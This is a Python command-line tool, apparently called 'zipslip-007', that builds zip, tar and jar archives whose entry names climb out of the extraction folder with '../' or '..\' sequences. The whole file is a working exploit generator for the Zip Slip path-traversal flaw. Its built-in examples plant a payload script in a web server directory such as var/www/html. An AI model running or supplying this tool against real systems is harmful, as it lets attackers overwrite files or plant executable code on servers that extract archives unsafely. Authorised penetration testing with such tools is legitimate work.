#!/usr/bin/env python3

import os, sys
import tarfile
from termcolor import colored
import zipfile,argparse

def getArguments():
    parser = argparse.ArgumentParser("Create Archive Payload to exploit Zipslip")
    parser.add_argument('-i','--input',dest='payloadFile',help="Payload File that has to be written/overwritten on target server")
    parser.add_argument('-o','--output',dest='outputFile',help="Output File Name",default='Exploit.tar')
    parser.add_argument('-t','--type',dest='archiveType',help="File Type - zip,tar,gz,tgz,bz2,jar (Default: tar)",default='tar')
    parser.add_argument('-d','--depth',dest='depth',help="Depth of the Traversal [Default: 3]",default=3,type=int)
    parser.add_argument('-p','--path',dest='path',help="Path to append to the traversal. Ex: var/www/webroot [Default: None]")
    parser.add_argument('--os',dest='targetOS',help="Target Platform (win|unix) [Default:unix)",default="unix")
    parser.add_argument('--dir','--completeDir',dest='completeDir',help="Add All files in the provided directory to the archive")
    parser.add_argument('-ex','--example',dest='exampleUsage',action="store_true",help="List Usage Examples")
    args = parser.parse_args()

    if args.exampleUsage:
        printExamples()
        exit()

    return args


def createZip(payloadFile,outputFile,traversalPath,completeDir):
    zf = zipfile.ZipFile(outputFile, "w")
    zf.write(payloadFile, traversalPath)

    if completeDir:
        for foldername, subfolders, filenames in os.walk(completeDir):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                relative_path = os.path.relpath(file_path, completeDir)
                zf.write(file_path, relative_path)
    zf.close()

    print(colored(f"|- File Created   :","cyan"),colored(f"{outputFile}","red"))
    print(colored(f"|- with Payload   :","cyan"),colored(f"{traversalPath}","red"))
    print(colored(f"|- with Directory :","cyan"),colored(f"{completeDir}","red"))
    print(colored(f"|- Verify Command :","cyan"),colored(f"zipinfo {outputFile}","red"))

    
def createTar(payloadFile,outputFile,traversalPath,completeDir,mode):
    with tarfile.open(outputFile,mode) as tar:
        tar.add(payloadFile, traversalPath)  #Add the payload with archiveName as traversalPath
        if completeDir:
            files = os.listdir(completeDir)
            os.chdir(completeDir)
            for file in files:
                tar.add(file)

    print(colored(f"|- File Created   :","cyan"),colored(f"{outputFile}","red"))
    print(colored(f"|- with Payload   :","cyan"),colored(f"{traversalPath}","red"))
    print(colored(f"|- with Directory :","cyan"),colored(f"{completeDir}","red"))
    print(colored(f"|- Verify Command :","cyan"),colored(f"tar -tvf {outputFile}","red"))

def printExamples():
    print(colored("[-]Depth and Path Usage","yellow"))
    print(colored("-p var/www/html -d 32   ===>  ../../var/www/html/<payload.sh>\n","magenta"))

    print(colored("[-]Complete Directory","yellow"))
    print(colored("--dir mydir             ==> Adds all files & folders in mydir/ to the archive\n","magenta"))

    print(colored("[-]Create Zip Archive with depth=4, path=/var/www/html, payloadFile=payload.sh, completeDir=/mustHaveDir","yellow"))
    print(colored("zipslip-007 -i=payload.sh -o=exploit.zip -d=4 -p=var/www/html --dir=mustHaveDir -t=zip\n","magenta"))
    
    print(colored("[-]Create Tar Archive with depth=4, path=/var/www/html, payloadFile=payload.sh","yellow"))
    print(colored("zipslip-007 -i=payload.sh -o=exploit.zip -d=4 -p=var/www/html -t=tar\n","magenta"))
    

def main():
    args = getArguments()
    payloadFile = args.payloadFile
    outputFile = args.outputFile
    archiveType = args.archiveType
    depth = args.depth
    path = args.path or ""
    targetOS = args.targetOS
    completeDir = args.completeDir or None

    if not os.path.exists(payloadFile):
        sys.exit("[-]Invalid payload file")

    if completeDir and not os.path.exists(completeDir):
        sys.exit("[-]Invalid Directory Provided")
        
    if targetOS == "unix":
        traversal = "../"
        if path and path[-1] != '/':
            path += '/'
    else:
        traversal = "..\\"
        if path and path[-1] != '\\':
            path += '\\'

    traversalPath = f"{traversal*depth}{path}{os.path.basename(payloadFile)}"

    if archiveType == "zip" or archiveType == "jar":
        createZip(payloadFile,outputFile,traversalPath,completeDir)
        exit()

    elif archiveType == "tar":
        mode = "w"

    elif archiveType == "gz" or archiveType == "tgz":
        mode = "w:gz"

    elif archiveType == "bz2":
        mode = "w:bz2"

    else:
        sys.exit("[-]Unsupported Archive Format: " + archiveType)

    createTar(payloadFile,outputFile,traversalPath,completeDir,mode)


if __name__ == '__main__':
     main()
